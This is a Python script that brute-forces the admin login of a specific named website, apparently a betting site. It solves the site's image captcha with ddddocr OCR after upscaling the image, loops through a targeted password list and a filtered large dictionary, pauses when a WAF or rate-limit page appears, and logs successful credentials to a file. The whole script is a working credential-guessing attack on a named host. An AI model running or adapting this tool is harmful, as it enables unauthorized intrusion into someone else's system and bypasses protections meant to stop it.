#!/usr/bin/env python3
"""bc_brute.py - 075588866576 admin brute with BMP captcha OCR (ddddocr 3x enhance)
Login: POST /admin/adminpass.asp fields admin/password/VerifyCode
Captcha: /admin/vCode.asp BMP (64x18), ddddocr with 3x upscale + binarize
"""
import urllib.request, urllib.parse, re, http.cookiejar, io, subprocess, sys, time
from PIL import Image

HOST = "http://075588866576.com"
UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
OUT = "/tmp/bc_hits.txt"

def ocr_enhance(img_bytes):
    """ddddocr with 3x upscale + binarize via PIL"""
    import base64
    # preprocess locally then base64 to ddddocr
    img = Image.open(io.BytesIO(img_bytes)).convert("L")
    img = img.resize((img.width * 3, img.height * 3), Image.LANCZOS)
    img = img.point(lambda x: 0 if x < 140 else 255)
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    b64 = base64.b64encode(buf.getvalue()).decode()
    code = ("import ddddocr,base64,io; from PIL import Image; "
            "o=ddddocr.DdddOcr(show_ad=False); "
            "print(o.classification(base64.b64decode('%s')))" % b64)
    r = subprocess.run([sys.executable, "-c", code], capture_output=True, timeout=20, cwd="/tmp")
    return r.stdout.decode().strip()

def try_login(op, pw, max_tries=8):
    for t in range(max_tries):
        # get login page (session)
        code, final, body = fetch(op, HOST + "/admin/index.asp")
        # get captcha
        code, final, cap = fetch(op, HOST + "/admin/vCode.asp",
                                 headers={"Referer": HOST + "/admin/index.asp"})
        if code != 200 or len(cap) < 100:
            continue
        cap_text = ocr_enhance(cap)
        if not cap_text or len(cap_text) < 4:
            continue
        data = urllib.parse.urlencode({"admin": "admin", "password": pw, "VerifyCode": cap_text})
        code, final, resp = fetch(op, HOST + "/admin/adminpass.asp", data=data,
                                  headers={"Referer": HOST + "/admin/index.asp",
                                           "X-Requested-With": "XMLHttpRequest"})
        rt = resp.decode("gbk", "ignore")
        # WAF / rate limit
        if "stopinfo" in final or "stopinfo" in rt:
            time.sleep(30)
            continue
        if "验证码" in rt and ("错误" in rt or "不正确" in rt):
            continue  # OCR wrong, retry
        if "密码" in rt and ("错误" in rt or "不正确" in rt):
            return False, rt[:100]  # password wrong
        # possible success - check
        if "成功" in rt or "欢迎" in rt or "index" in rt.lower() or len(rt) < 50:
            return True, rt[:200]
        return False, rt[:100]
    return False, "ocr-fail"

def fetch(op, url, data=None, timeout=12, headers=None):
    h = {**UA, "Content-Type": "application/x-www-form-urlencoded"}
    if headers: h.update(headers)
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read()
    except urllib.error.HTTPError as e:
        return e.code, url, e.read()
    except Exception as ex:
        return 0, url, str(ex).encode()

def main():
    pws = []
    # targeted: betting-site passwords + common
    base = ["123456", "admin123", "admin888", "123456789", "666888", "888888", "000000",
            "tl123456", "tenglong", "tenglong123", "agent", "agent123", "kf123456",
            "lehu123", "bet123", "qwe123", "abc123", "123123", "111111", "222222",
            "admin", "admin666", "a123456", "123456a", "admin2020", "admin2021",
            "admin2022", "admin2023", "admin2024", "admin2025", "tl888888", "tenglong888",
            "075588866576", "0755", "88886666", "12345678", "1234567890", "password",
            "qwerty", "zxcvbn", "1q2w3e4r", "qazwsx", "147258", "159357", "258369",
            "5201314", "woaini", "1314520", "a123456789", "123456789a", "admin!@#"]
    # read mega dict subset
    try:
        with open("/opt/msray/pw_mega.txt") as f:
            mega = [l.strip() for l in f if l.strip()]
        # filter betting-related + short nums
        for pw in mega:
            if re.match(r'^(tl|tenglong|agent|kf|lehu|admin|bet)', pw, re.I) or re.match(r'^\d{4,10}$', pw):
                if pw not in pws:
                    pws.append(pw)
    except Exception:
        pass
    # dedupe preserve order
    seen = set()
    pws = [p for p in pws if not (p in seen or seen.add(p))]
    print("passwords: %d" % len(pws), flush=True)

    for i, pw in enumerate(pws):
        cj = http.cookiejar.CookieJar()
        op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
        ok, info = try_login(op, pw)
        if ok:
            print("!!! HIT admin/%s -> %s" % (pw, info), flush=True)
            with open(OUT, "a") as f:
                f.write("HIT admin/%s %s\n" % (pw, info))
            return
        if i % 5 == 0:
            print("  %d/%d admin/%s %s" % (i, len(pws), pw, info[:60]), flush=True)
        time.sleep(0.3)
    print("[done] no hit", flush=True)

if __name__ == "__main__":
    main()
